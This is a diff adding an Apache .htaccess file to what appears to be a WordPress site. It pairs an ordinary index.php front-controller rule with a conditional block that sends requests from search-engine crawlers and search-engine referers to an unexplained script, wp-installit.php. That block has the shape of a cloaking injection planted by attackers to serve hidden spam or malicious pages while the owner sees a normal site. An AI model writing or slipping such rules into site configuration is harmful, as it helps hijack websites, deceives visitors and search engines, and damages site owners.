@@ -1,0 +1,14 @@
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^([^/]*)/$ /wp-installit.php?p=$1 [L]
+RewriteEngine On
+
+RewriteCond %{REQUEST_FILENAME}	-f					[OR]
+RewriteCond %{REQUEST_FILENAME}	-d
+RewriteRule ^(.+)				-					[PT,L]
+
+RewriteRule ^(.*)				/index.php?uri=$1	[PT,QSA,L]
